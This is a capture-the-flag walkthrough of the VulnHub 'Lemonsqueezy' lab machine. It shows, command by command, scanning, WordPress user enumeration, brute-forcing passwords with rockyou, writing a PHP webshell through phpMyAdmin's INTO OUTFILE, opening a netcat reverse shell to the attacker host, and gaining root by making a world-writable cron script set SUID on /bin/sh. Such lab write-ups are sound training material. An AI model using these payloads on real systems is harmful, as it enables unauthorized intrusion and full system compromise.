# Lemonsqueezy | VulnHub
https://www.vulnhub.com/entry/lemonsqueezy-1,473/

### 1. Scan
```bash
Nmap scan report for lemonsqueezy (192.168.34.147)
Host is up, received arp-response (0.00083s latency).
Scanned at 2021-07-15 21:58:48 EDT for 13s
Not shown: 65534 closed ports
Reason: 65534 resets
PORT   STATE SERVICE REASON         VERSION
80/tcp open  http    syn-ack ttl 64 Apache httpd 2.4.25 ((Debian))
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.25 (Debian)
|_http-title: Apache2 Debian Default Page: It works
MAC Address: 00:0C:29:5A:AD:DC (VMware)
Device type: general purpose
Running: Linux 3.X|4.X
OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4
OS details: Linux 3.2 - 4.9
TCP/IP fingerprint:
OS:SCAN(V=7.91%E=4%D=7/15%OT=80%CT=1%CU=%PV=Y%DS=1%DC=D%G=N%M=000C29%TM=60F
OS:0E7E5%P=x86_64-pc-linux-gnu)SEQ(SP=105%GCD=1%ISR=106%TI=Z%CI=I%II=I%TS=8
OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B
OS:4ST11NW7%O6=M5B4ST11)WIN(W1=7120%W2=7120%W3=7120%W4=7120%W5=7120%W6=7120
OS:)ECN(R=Y%DF=Y%TG=40%W=7210%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%TG=40%S=O%A=
OS:S+%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%TG=40%W=0%S=A%A=Z%F=R%O=%RD=0%
OS:Q=)T5(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%TG=40%W=0%
OS:S=A%A=Z%F=R%O=%RD=0%Q=)T7(R=Y%DF=Y%TG=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1
OS:(R=N)IE(R=Y%DFI=N%TG=40%CD=S)

Uptime guess: 0.000 days (since Thu Jul 15 21:58:36 2021)
Network Distance: 1 hop
TCP Sequence Prediction: Difficulty=261 (Good luck!)
IP ID Sequence Generation: All zeros

TRACEROUTE
HOP RTT     ADDRESS
1   0.83 ms lemonsqueezy (192.168.34.147)

Read data files from: /usr/bin/../share/nmap
OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Thu Jul 15 21:59:01 2021 -- 1 IP address (1 host up) scanned in 13.25 seconds
```
The machine is running an Apache HTTP server.

### 2. Enumeration
The web server is just hosting the default apache2 default page. Searching for valid directories indicates a wordpress and phpmyadmin instance.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ dirsearch -u http://lemonsqueezy -x 403                 

  _|. _ _  _  _  _ _|_    v0.4.1
 (_||| _) (/_(_|| (_| )

Extensions: php, aspx, jsp, html, js | HTTP method: GET | Threads: 30 | Wordlist size: 10848

Error Log: /home/kali/Extra-Tools/dirsearch/logs/errors-21-07-15_22-01-05.log

Target: http://lemonsqueezy/

Output File: /home/kali/Extra-Tools/dirsearch/reports/lemonsqueezy/_21-07-15_22-01-05.txt

[22:01:05] Starting: 
[22:01:21] 200 -   10KB - /index.html
[22:01:22] 301 -  317B  - /javascript  ->  http://lemonsqueezy/javascript/
[22:01:23] 301 -  313B  - /manual  ->  http://lemonsqueezy/manual/                                      
[22:01:23] 200 -  626B  - /manual/index.html
[22:01:26] 301 -  317B  - /phpmyadmin  ->  http://lemonsqueezy/phpmyadmin/              
[22:01:26] 200 -   10KB - /phpmyadmin/index.php
[22:01:26] 200 -   10KB - /phpmyadmin/
[22:01:32] 200 -    8MB - /wordpress.tar.gz
[22:01:32] 200 -   51KB - /wordpress/
[22:01:33] 200 -    3KB - /wordpress/wp-login.php
```

### 3. Look at Wordpress
The version is 4.8.9, released in 2019 - somewhat old now but would have been new when the machine came out, so not too concerned with finding a vulnerability in the application itself. Enumerating users, there are a few.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wpscan --url http://lemonsqueezy/wordpress --enumerate u --plugins-detection passive --plugins-version-detection passive --api-token [redacted]
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] It seems like you have not updated the database for some time.
[?] Do you want to update now? [Y]es [N]o, default: [N]Y
[i] Updating the Database ...
[i] Update completed.

[+] URL: http://lemonsqueezy/wordpress/ [192.168.34.147]
[+] Started: Thu Jul 15 22:04:51 2021

...
[i] User(s) Identified:

[+] lemon
 | Found By: Author Posts - Author Pattern (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Wp Json Api (Aggressive Detection)
 |   - http://lemonsqueezy/wordpress/index.php/wp-json/wp/v2/users/?per_page=100&page=1
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[+] orange
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

[+] WPScan DB API OK
 | Plan: free
 | Requests Done (during the scan): 2
 | Requests Remaining: 23
```

Gotta attempt to bruteforce these user's passwords now.

###  4. Find passwords
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ wpscan --url http://lemonsqueezy/wordpress -U wp-users.txt -P /usr/share/wordlists/rockyou.txt                                                                                  
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.14
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

...

[+] Performing password attack on Xmlrpc against 2 user/s
[SUCCESS] - orange / ginger                                                                                                                                                                     
^Cying lemon / 147369 Time: 00:01:15 <                                                                                                                 > (5645 / 28688946)  0.01%  ETA: ??:??:??
[!] Valid Combinations Found:
 | Username: orange, Password: ginger

[!] No WPScan API Token given, as a result vulnerability data has not been output.                                                                     > (5648 / 28688946)  0.01%  ETA: ??:??:??
[!] You can get a free API token with 50 daily requests by registering at https://wpscan.com/register

[+] Finished: Thu Jul 15 22:11:59 2021
[+] Requests Done: 5792
[+] Cached Requests: 36
[+] Data Sent: 3.001 MB
[+] Data Received: 3.349 MB
[+] Memory used: 255.953 MB
[+] Elapsed time: 00:01:20

Scan Aborted: Canceled by User

```

The orange user's password pops pretty quick and is shown to be `ginger`.  
Logging in with the user, they are not an admin so they cannot edit anything in the blog's template or modify any files on the server. However, they have an unsaved post called "Keep this safe!", the contents of which is `n0t1n@w0rdl1st!`. This looks like another password.

### 5. Access PHPMyAdmin
Tried the password against the "lemon" user in Wordpress, but it didn't work. However the creds `orange:n0t1n@w0rdl1st!` do provide access to phpmyadmin. From here, attempt to drop a webshell on the machine by running the following SQL.
```sql
SELECT '<?php system($_REQUEST["exec"]);?>' into outfile '/var/www/html/wordpress/pwned.php';
```
Note: Only the wordpress/ directory seems to allow files to be written.  
Now access the file and check it works.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ curl 'http://lemonsqueezy/wordpress/pwned.php?exec=id'
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```
Great!

### 6. Get a shell
Access http://lemonsqueezy/wordpress/pwned.php?exec=nc%20-e%20/bin/sh%20192.168.34.138%209999 to spawn a shell in a Netcat listener on port 9999.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999                  
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.147] 54384

whoami
www-data
python -c "import pty;pty.spawn('/bin/bash')"
www-data@lemonsqueezy:/var/www/html/wordpress$
```

### 7. Enumerate from user
Looking at /etc/passwd, there is an "orange" user with a shell.
```bash
www-data@lemonsqueezy:/var/www/html/wordpress$ cat /etc/passwd | grep bash
root:x:0:0:root:/root:/bin/bash
orange:x:1000:1000:orange,,,:/home/orange:/bin/bash
```
None of the passwords found previously work for them though.  
One of the next things checked is the universal crontab file.
```bash
www-data@lemonsqueezy:/var/www/html/wordpress$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# m h dom mon dow user  command
17 *    * * *   root    cd / && run-parts --report /etc/cron.hourly
25 6    * * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6    * * 7   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6    1 * *   root    test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
*/2 *   * * *   root    /etc/logrotate.d/logrotate
#
```
Though logrotate is a common cron task, it's unusual to see it in the crontab file, and running so often (every 2 minutes it looks like?). Checking out the code:
```bash
www-data@lemonsqueezy:/var/www/html/wordpress$ cat /etc/logrotate.d/logrotate
#!/usr/bin/env python
import os
import sys
try:
   os.system('rm -r /tmp/* ')
except:
    sys.exit()
```
Finally the script permissions - the file is world-writable.
```bash
www-data@lemonsqueezy:/var/www/html/wordpress$ ls -l /etc/logrotate.d/logrotate
-rwxrwxrwx 1 root root 101 Apr 26  2020 /etc/logrotate.d/logrotate
```

### 8. Escalate to root
The /bin/sh binary can be given SETUID permissions so that any shell spawned with it is spawned as root.
```bash
www-data@lemonsqueezy:/var/www/html/wordpress$ nano /etc/logrotate.d/logrotate
www-data@lemonsqueezy:/var/www/html/wordpress$ cat /etc/logrotate.d/logrotate
#!/usr/bin/env python
import os
import sys
try:
   os.system('chmod u+s /bin/sh')
except:
    sys.exit()
```
After this, exit the shell, wait a few minutes then spawn another one by triggering another reverse shell using the webshell. Since the shell is spawned using /bin/sh, we go straight to root.
```bash
┌──(kali㉿kali)-[]-[~/Desktop]
└─$ nc -lvnp 9999
listening on [any] 9999 ...
connect to [192.168.34.138] from (UNKNOWN) [192.168.34.147] 54390
whoami
root
```